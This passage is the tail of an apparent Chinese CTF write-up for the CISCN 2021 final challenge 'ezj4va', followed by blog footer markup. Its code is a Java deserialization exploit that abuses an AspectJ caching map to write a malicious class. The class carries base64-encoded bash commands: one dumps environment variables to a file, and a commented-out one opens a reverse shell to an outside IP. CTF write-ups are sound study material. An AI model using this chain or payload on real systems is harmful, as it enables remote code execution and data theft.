ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getPostObject</span><span class="params">(String filename, <span class="keyword">byte</span>[] content)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cart cart = <span class="keyword">new</span> Cart();</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(filename,content);</span><br><span class="line">        setFieldValue(cart,<span class="string">&quot;skuDescribe&quot;</span>,map);</span><br><span class="line">        <span class="keyword">return</span> cart;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getCookieObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cart cart = <span class="keyword">new</span> Cart();</span><br><span class="line">        Constructor ctor = getFirstCtor(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Object simpleCache = ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        setFieldValue(cart,<span class="string">&quot;skuDescribe&quot;</span>,simpleCache);</span><br><span class="line">        <span class="keyword">return</span> cart;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getTestObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        test2 t = <span class="keyword">new</span> test2();</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String filename = <span class="string">&quot;./../classes/ciscn/fina1/ezj4va/test2.class&quot;</span>;</span><br><span class="line"><span class="comment">//        byte[] content = Base64.getDecoder().decode(&quot;yv66vgAAADQANwoACQAcCQAdAB4IAB8KACAAIQoAIgAjCAAkCgAiACUHACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGUxjaXNjbi9maW5hMS9lemo0dmEvdGVzdDsBAApFeGNlcHRpb25zBwApAQAKcmVhZE9iamVjdAEAHihMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTspVgEAA29pcwEAG0xqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOwcAKgcAKwEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAsADAcALAwALQAuAQAXU2VyaWFsaXphYmxlIHJlYWRPYmplY3QHAC8MADAAMQcAMgwAMwA0AQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURNdU1UVXlMakV6TWk0eE5pODVNREF3SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQwANQA2AQAXY2lzY24vZmluYTEvZXpqNHZhL3Rlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACQABAAoAAAACAAEACwAMAAIADQAAADMAAQABAAAABSq3AAGxAAAAAgAOAAAACgACAAAADAAEAA4ADwAAAAwAAQAAAAUAEAARAAAAEgAAAAQAAQATAAIAFAAVAAIADQAAAE4AAgACAAAAErIAAhIDtgAEuAAFEga2AAdXsQAAAAIADgAAAA4AAwAAABAACAARABEAEgAPAAAAFgACAAAAEgAQABEAAAAAABIAFgAXAAEAEgAAAAYAAgAYABkAAQAaAAAAAgAb&quot;);</span></span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANwoACQAcCQAdAB4IAB8KACAAIQoAIgAjCAAkCgAiACUHACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGkxjaXNjbi9maW5hMS9lemo0dmEvdGVzdDI7AQAKRXhjZXB0aW9ucwcAKQEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAANvaXMBABtMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTsHACoHACsBAApTb3VyY2VGaWxlAQAKdGVzdDIuamF2YQwACwAMBwAsDAAtAC4BABdTZXJpYWxpemFibGUgcmVhZE9iamVjdAcALwwAMAAxBwAyDAAzADQBAEViYXNoIC1jIHtlY2hvLFpXNTJJRDRnTGk0dlkyeGhjM05sY3k5M2QzY3VlbWx3fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0MADUANgEAGGNpc2NuL2ZpbmExL2V6ajR2YS90ZXN0MgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAEACgAAAAIAAQALAAwAAgANAAAAMwABAAEAAAAFKrcAAbEAAAACAA4AAAAKAAIAAAAMAAQADgAPAAAADAABAAAABQAQABEAAAASAAAABAABABMAAgAUABUAAgANAAAATgACAAIAAAASsgACEgO2AAS4AAUSBrYAB1exAAAAAgAOAAAADgADAAAAEAAIABIAEQATAA8AAAAWAAIAAAASABAAEQAAAAAAEgAWABcAAQASAAAABgACABgAGQABABoAAAACABs=&quot;</span>);        Object post = getPostObject(filename, content);</span><br><span class="line">        String skus = Serializer.serialize(post);</span><br><span class="line">        <span class="comment">// 构造Cookie中cart类</span></span><br><span class="line">        Object cookie = getCookieObject();</span><br><span class="line">        String oldCartStr = Serializer.serialize(cookie);</span><br><span class="line">        String evil = Serializer.serialize(getTestObject());</span><br><span class="line">        System.out.println(<span class="string">&quot;Cookie: cart=&quot;</span>+oldCartStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;POST: skus=&quot;</span>+ java.net.URLEncoder.encode(skus,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;evil class: &quot;</span>+java.net.URLEncoder.encode(evil,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// test unser</span></span><br><span class="line"><span class="comment">//        Cart toAdd =(Cart) Deserializer.deserialize(skus);</span></span><br><span class="line"><span class="comment">//        Cart cart=null;</span></span><br><span class="line"><span class="comment">//        if(oldCartStr!=null)</span></span><br><span class="line"><span class="comment">//            cart= (Cart) Deserializer.deserialize(oldCartStr);</span></span><br><span class="line"><span class="comment">//        if(cart==null)</span></span><br><span class="line"><span class="comment">//            cart=new Cart();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        if(toAdd.getSkuDescribe()!=null)&#123;</span></span><br><span class="line"><span class="comment">//            Map skuDescribe = cart.getSkuDescribe();</span></span><br><span class="line"><span class="comment">//            for(Map.Entry&lt;String,Object&gt; entry:toAdd.getSkuDescribe().entrySet())&#123;</span></span><br><span class="line"><span class="comment">//                skuDescribe.put(entry.getKey(),entry.getValue());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最好重新命名类 不然可能有问题</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210903094904479.png" alt="image-20210903094904479"></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/>http://www.moonback.xyz/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-03-17T20:11:32+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年3月17日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ciscn/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ciscn</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/&title=ciscn 复现writeup - 明月归的小站&summary=复现一下web的题目"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/&title=ciscn 复现writeup - 明月归的小站&summary=复现一下web的题目"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/&title=ciscn 复现writeup - 明月归的小站&summary=复现一下web的题目"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/09/04/%E5%88%B7%E9%A2%98/ctftime/2021/9-4%20ALLES!%20CTF%202021/writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ALLES! CTF 2021</p>
+                <p class='content'>ALLES! CTF 2021
+
+
+webSanity Checkrobots.txt 有flag
+J(ust)-S(erving)-P(ages)java题
+
+注册的用户存在上下文了 没在数据...</p>
+              </a>
+            
+            
+              <a class='next' href='/2021/08/28/%E5%88%B7%E9%A2%98/ctftime/2021/8-28%20WMCTF%202021/wmctf2021/'>
+                <p class='title'>WMCTF 2021 writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>WMCTF 2021
+
+
+webez piwigo0day github拉代码
+搜了下cnvd 有个任意文件读 设置好条件 就可以读：
+123admin.php?page&#x3D;plugin...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quals"><span class="toc-text">Quals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#filter"><span class="toc-text">filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%9A%84trick"><span class="toc-text">编码的trick</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#final"><span class="toc-text">final</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babypython"><span class="toc-text">babypython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-python"><span class="toc-text">easy_python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezj4va"><span class="toc-text">ezj4va</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
